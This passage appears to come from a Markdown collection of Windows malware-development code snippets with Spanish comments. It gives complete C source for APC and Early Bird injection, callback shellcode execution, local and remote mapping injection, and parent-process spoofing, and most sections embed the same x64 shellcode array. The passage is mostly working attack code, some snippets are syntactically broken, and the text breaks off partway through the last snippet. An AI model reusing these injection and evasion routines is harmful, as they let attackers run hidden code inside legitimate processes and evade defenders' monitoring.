#endif // !RUN_BY_ALERTABLETHREAD




// if RUN_BY_ALERTABLETHREAD is defined (#ifdef) - then we are using an alertable thread to do apc injection

#ifdef RUN_BY_ALERTABLETHREAD
// use one of the following to do apc injection through an alertable thread


VOID AlertableFunction1() {
    
    SleepEx(INFINITE, TRUE);
}

VOID AlertableFunction2() {

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if (hEvent) {
        WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
        CloseHandle(hEvent);
    }
}


VOID AlertableFunction3() {

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if (hEvent){
        WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
        CloseHandle(hEvent);
    }
}


VOID AlertableFunction4() {

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if (hEvent) {
        MsgWaitForMultipleObjectsEx(1, &hEvent, INFINITE, QS_KEY, MWMO_ALERTABLE);
        CloseHandle(hEvent);
    }
}


VOID AlertableFunction5() {
    
    HANDLE hEvent1  = CreateEvent(NULL, NULL, NULL, NULL);
    HANDLE hEvent2  = CreateEvent(NULL, NULL, NULL, NULL);

    if (hEvent1 && hEvent2) {
        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
        CloseHandle(hEvent1);
        CloseHandle(hEvent2);
    }
}
#endif // RUN_BY_ALERTABLETHREAD



/*
parameters: 
    - hThread is the handle of a alertable or suspended thread to use for apc injection
    - pPayload is the payload base address
    - sPayloadSize is the payload size
*/

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID       pAddress            = NULL;
    DWORD       dwOldProtection     = NULL;

    
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);
    
    printf("\t[i] Payload Written To : 0x%p \n", pAddress);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }


    printf("\t[#] Press <Enter> To Run ... ");
    getchar();

    // if `hThread` is in an alertable state, QueueUserAPC will run the payload directly
    // if `hThread` is in a suspended state, the payload won't be executed unless the thread is resumed after
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}




int main(){


    HANDLE      hThread         = NULL;
    DWORD       dwThreadId      = NULL;

//-------------------------------------------------------------------------------------------

#ifndef RUN_BY_ALERTABLETHREAD
    hThread = CreateThread(NULL, NULL, &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] Suspended Target Thread Created With Id : %d \n", dwThreadId);

#endif // !RUN_BY_ALERTABLETHREAD


#ifdef RUN_BY_ALERTABLETHREAD
    hThread = CreateThread(NULL, NULL, &AlertableFunction5, NULL, NULL, &dwThreadId);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
#endif // RUN_BY_ALERTABLETHREAD


//-------------------------------------------------------------------------------------------

    printf("[i] Running Apc Injection Function ... \n");
    if (!RunViaApcInjection(hThread, Payload, sizeof(Payload))) {
        return -1;
    }
    printf("[+] DONE \n");

//-------------------------------------------------------------------------------------------

#ifndef RUN_BY_ALERTABLETHREAD
    // resuming the thread in case we are targetting a suspended thread
    printf("[i] Resuming Thread ...");
    ResumeThread(hThread);
    printf("[+] DONE \n");
#endif // !RUN_BY_ALERTABLETHREAD

//-------------------------------------------------------------------------------------------


    WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;

}

```

## Early Bird APC Injection

```c

//Create a debugged process by setting the DEBUG_PROCESS flag.
//Write the payload to the address space of the new target process.
//Get the debugged thread's handle from CreateProcess along with the payload's base address and pass them to QueueUserAPC.
//Stop the debugging of the remote process using DebugActiveProcessStop which resumes its threads and executes the payload.

#include <stdio.h>
#include <windows.h>

#pragma warning(disable : 4996)
#define PROCESSNAME "notepad.exe"
BOOL CreateSuspendedProcess(LPWSTR dwProcessName, HANDLE* hProcess, HANDLE* hThread, DWORD* dwProcessId) {

    CHAR lpath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFO);
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("Error el encontrar variable de entorno\n");
        return FALSE;
    }

    sprintf(lpath, "%s\\System32\\%s", WnDr, dwProcessName);
    printf("Corriendo el proceso %s\n", lpath);

    if (!CreateProcessA(NULL, lpath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi)) {
        printf("Error al crear proceso...\n");
        return FALSE;
    }

    *hProcess = pi.hProcess;
    *dwProcessId = pi.dwProcessId; 
    *hThread = pi.hThread;

    return TRUE;
}

BOOL InjectShellcode(HANDLE hProcess, PBYTE buf, SIZE_T sbufSize, HANDLE* pAddress) {

    SIZE_T numberOfBytesWritten = 0;
    DWORD oldProtection = NULL;

    *pAddress = VirtualAllocEx(hProcess, NULL, sbufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*pAddress == NULL) {
        printf("Error al crear espacio en memoria remota...\n");
        return FALSE;
    }

    printf("Espacio en memoria creado %p\n", *pAddress);
    getchar();
    
    if(!WriteProcessMemory(hProcess, *pAddress, buf, sbufSize, &numberOfBytesWritten) || numberOfBytesWritten != sbufSize) {
        printf("Error al sobreescribir memoria remota...\n");
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *pAddress, sbufSize, PAGE_EXECUTE_READWRITE, &oldProtection)) {
        printf("Error al cambiar proteccion de memoria...\n");
        return FALSE;
    }

    printf("Se sobreescribio buf en espacio en memoria %p\n", *pAddress);
    getchar();

    return TRUE;
}

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



int main() {
    
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    HANDLE pAddress = NULL;

    //Primer crear el proceso y obtener hProcess, dwProcessId y hThread;
    if (!CreateSuspendedProcess(PROCESSNAME, &hProcess, &hThread, &dwProcessId)) {
        printf("Error al crear proceso..\n");
        return 1;
    }
    printf("Proceso %s con id %d\n", PROCESSNAME, dwProcessId);

    if (!InjectShellcode(hProcess, buf, sizeof(buf), &pAddress)) {
        printf("Error al inyectar shellcode...\n");
        return 1;
    }

    QueueUserAPC(pAddress, hThread, NULL);

    printf("Enter para ejecutar shellcode...\n");
    getchar();
    DebugActiveProcessStop(dwProcessId);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
```

# Callback Code Execution

```c
//https://github.com/aahmad097/AlternativeShellcodeExec

#include <Windows.h>
#include <stdio.h>
#include <avrfsdk.h>


#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};




int main() {

    HANDLE      hTimer          = NULL;
    DWORD       dwThreadId = 0;

    typedef ULONG(WINAPI* fnVerifierEnumerateResource)(
        HANDLE                           Process,
        ULONG                            Flags,
        ULONG                            ResourceType,
        AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback,
        PVOID                            EnumerationContext
    );
    

    printf("[i] Payload At : 0x%p \n", Payload);
    printf("[#] Press <Enter> To Run CreateTimerQueueTimer ... ");
    getchar();


    if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)Payload, NULL, NULL, NULL, NULL)){
        printf("[!] CreateTimerQueueTimer Failed With Error : %d \n", GetLastError());
        return -1;
    }

    if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
        printf("[!] EnumChildWindows Failed With Error : %d \n", GetLastError());
        return -1;
    }

    if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)Payload, MUI_LANGUAGE_NAME, NULL)) {
        printf("[!] EnumUILanguagesW Failed With Error : %d \n", GetLastError());
        return -1;
    }

    EnumThreadWindows(dwThreadId, (WNDENUMPROC)Payload, NULL);

    HMODULE hModule = NULL;
    fnVerifierEnumerateResource pVerifierEnumerateResource = NULL;

    hModule = LoadLibraryA("verifier.dll");
    if (hModule == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
        return -1;
    }

    pVerifierEnumerateResource = GetProcAddress(hModule, "VerifierEnumerateResource");
    if (pVerifierEnumerateResource == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return -1;
    }

    pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload, NULL);
     
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
```

# Mapping Injection
## Local Mapping Injection


```c
BOOL GenerateFileMapping(PBYTE buff, DWORD sBuffSize, HANDLE* ppAddress) {
    
    HANDLE hFileMapping = NULL;
    PVOID pMapAddress = NULL;
    SIZE_T numberOfBytesToMap = 0;
    hFileMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sBuffSize, NULL);
    if (hFileMapping == NULL) {
        printf("Error el crear memory mapping...\n");
        return FALSE;
    }

    pMapAddress = MapViewOfFile(hFileMapping, FILE_MAP_EXECUTE | FILE_MAP_WRITE, NULL, NULL, numberOfBytesToMap);
    if (pMapAddress == NULL) {
        printf("Error al mapear archivo...\n");
        return FALSE;
    }

    memcpy(pMapAddress, buff, sBuffSize);

    *ppAddress = pMapAddress;
    printf("Direccion de memoria %p\n", *ppAddress);

    return TRUE;

}


BOOL ExecuteShellcode(HANDLE ppAddress) {

    HANDLE hThread = NULL;
    hThread = CreateThread(NULL, NULL, ppAddress, CREATE_SUSPENDED, 0, NULL);
    if (hThread == NULL) {
        printf("Error al crear hilo...\n");
        return FALSE;
    }

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);


    return TRUE;
}


unsigned char buff[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



int main() {

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    HANDLE ppAddress = NULL;


    if (!GenerateFileMapping(buff, sizeof(buff), &ppAddress)) {
        printf("Error al generar mapping...\n");
        return 1;

    ExecuteShellcode(ppAddress);
}
```
## Remote Mapping Injection

```c
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

#pragma comment (lib, "OneCore.lib")

BOOL FindProcessHandle(LPWSTR lpProcessName, HANDLE* hProcess, DWORD* dwProcessId) {

    PROCESSENTRY32 pEntry = {.dwSize= sizeof(PROCESSENTRY32)};
    HANDLE hSnapShot = NULL;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, &pEntry);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("Error al crear snapshot\n");
        return FALSE;
    }

    if (!Process32FirstW(hSnapShot, &pEntry)) {
        printf("Error el imprimir valores del snapshot\n");
        return FALSE;
    }

    printf("Buscando nombre del proceso %ws ....\n", lpProcessName);
    
    do {
        
        if (wcscmp(pEntry.szExeFile, lpProcessName) == 0) {
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pEntry.th32ProcessID);
            *dwProcessId = pEntry.th32ProcessID;
            printf("flags: %s\n", pEntry.dwFlags);

            if (*hProcess == NULL) {
                printf("Error al obtener hProcess...\n");
                return FALSE;
            }

            break;
            
        }
    
    } while (Process32NextW(hSnapShot, &pEntry));

    if (*hProcess == NULL || *dwProcessId == NULL) {
        printf("Error al encontrar valores...\n");
        CloseHandle(hSnapShot);
        return FALSE;
    }

    CloseHandle(hSnapShot);
    return TRUE;
}

GenerateFileMapping(PBYTE pbBuff, SIZE_T szBuffSize, HANDLE hProcess,PVOID* pMapRemoteAddress) {

    HANDLE hFile = NULL;
    LPVOID lpMapAddress = NULL;
    PVOID pMapRemoteAddressOriginal = NULL;

    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, szBuffSize, NULL);
    if (hFile == NULL) {
        printf("Error al crear file mapping\n");
        return FALSE;
    }

    lpMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, szBuffSize);
    if (lpMapAddress == NULL) {
        printf("Error al obtener direccion del file mapping\n");
        return FALSE;
    }

    memcpy(lpMapAddress, pbBuff, szBuffSize);

    printf("Espacio en memoria de file mapping: %p\n", lpMapAddress);
    printf("Inyectando a mapping remoto...\n");
    // Maps the payload to a new remote buffer in the target process
    pMapRemoteAddressOriginal = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pMapRemoteAddressOriginal == NULL) {
        printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    *pMapRemoteAddress = pMapRemoteAddressOriginal;
    printf("Direccion de memoria remota: %p\n", pMapRemoteAddress);
    return TRUE;
}

unsigned char buff[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int wmain(int args, wchar_t* argv[]) {

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pMapRemoteAddress = NULL;

    if (!FindProcessHandle(argv[1], &hProcess, &dwProcessId)) {
        printf("Error al ejecutar funcion para buscar handel del proceso...\n");
        return 1;
    }
    printf("Id del proceso %ws es: %d\n", argv[1], dwProcessId);

    if (!GenerateFileMapping(buff, sizeof(buff), hProcess, &pMapRemoteAddress)) {
        printf("Error al crear mapping\n");
        return 1;
    }

    hThread = CreateRemoteThread(hProcess, NULL, NULL, pMapRemoteAddress, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return 1;
    }

    return 0;
}
```

# Spoofing PPID

```c
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

#pragma warning(disable: 4996)

BOOL EnumerateProcess(LPDWORD dwProcessName, DWORD* dwParentProcessId, HANDLE* hPProcess) {

    PROCESSENTRY32W proc = { .dwSize = sizeof(PROCESSENTRY32W)};

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error al tomar snapshot");
        return FALSE;
    }

    if (Process32FirstW(hSnapshot, &proc) == NULL) {
        printf("Error al recuperar primer elemento");
        return FALSE;
    }

    do {
    
        if (wcscmp(proc.szExeFile, dwProcessName) == 0) {
            printf("Se encontro el proceso: %ws\n", proc.szExeFile);
            printf("Id del proceso: %d\n", proc.th32ProcessID);
            printf("Id del proceso padre: %d\n", proc.th32ParentProcessID);

            *hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc.th32ParentProcessID);
            if (*hPProcess == NULL) {
                printf("Error al crear handle del proceso\n");
                return FALSE;
            }

            break;
        }
    
    } while (Process32NextW(hSnapshot, &proc));

    return TRUE;

}


BOOL CreateNewProcess(LPCSTR dwProcessName, DWORD hPProcess, HANDLE* hProcess, HANDLE* hThread, DWORD* dwProcessId) {

    LPDWORD processName = "notepad.exe";

    CHAR lpath[MAX_PATH * 2];
    CHAR windr[MAX_PATH];
    CHAR cdir[MAX_PATH];

    SIZE_T                          sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST     pThreadAttList = NULL;

    STARTUPINFOEXA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    GetEnvironmentVariableA("WINDIR", windr, MAX_PATH);

    sprintf(lpath, "%s\\System32\\%ws", windr, dwProcessName);

    sprintf(cdir, "%s\\System32\\", windr);

    printf("Esta es la ruta: %s\n", lpath);
    printf("Esta es la ruta actual: %s\n", cdir);

    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

    printf("Tamano de atributos: %d\n", sThreadAttList);

    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        printf("Error al crear espacion en memoria");
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        printf("Error el inicializar atributos...\n");
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPProcess, sizeof(HANDLE), NULL, NULL)) {
        printf("Error al actualizar atributos...\n");
        return FALSE;
    }

    printf("hpprocess...: %d\n", hPProcess);

    Si.lpAttributeList = pThreadAttList;

    if (!CreateProcessA(NULL, lpath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, cdir, &Si.StartupInfo, &Pi)) {
        printf("Error el crear proceso en funcion...\n");
        return FALSE;
    }

    *hProcess = Pi.hProcess;
    *hThread = Pi.dwThreadId;
    *dwProcessId = Pi.dwProcessId;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
        printf("La creacion del proceos termino con exito...\n");
        return TRUE;
    }


    return FALSE;

}

unsigned char buff[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int wmain(int args, wchar_t* argv[]) {

    DWORD dwProcessId = 0;
    DWORD dwParentProcessId = 0;
    HANDLE hPProcess = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwOldProtect;
    DWORD dwNumberOfBytesWritten;

    if (args < 2) {
        printf("Pon nombre del proceso\n");
        return -1;
    }

    if (!EnumerateProcess(argv[1], &dwParentProcessId, &hPProcess)) {
        printf("Error al encontrar proceso...\n");
        return -1;
    }

    if (!CreateNewProcess(argv[1], hPProcess, &hProcess, &hThread, &dwProcessId)) {
        printf("Error el crear proceso...\n");
        return -1;
    }

    printf("Id del proceso creado: %d\n", dwProcessId);

    HANDLE hAddress = VirtualAllocEx(hProcess, NULL, sizeof(buff), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (hAddress == NULL) {
        printf("Error el crear espacio en memoria...\n");
        return -1;
    }

    printf("Direccion de memoria de proceso remoto: %p\n", hAddress);

    WriteProcessMemory(hProcess, hAddress, buff, sizeof(buff), &dwNumberOfBytesWritten);

    if (!VirtualProtectEx(hProcess, hAddress, sizeof(buff), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
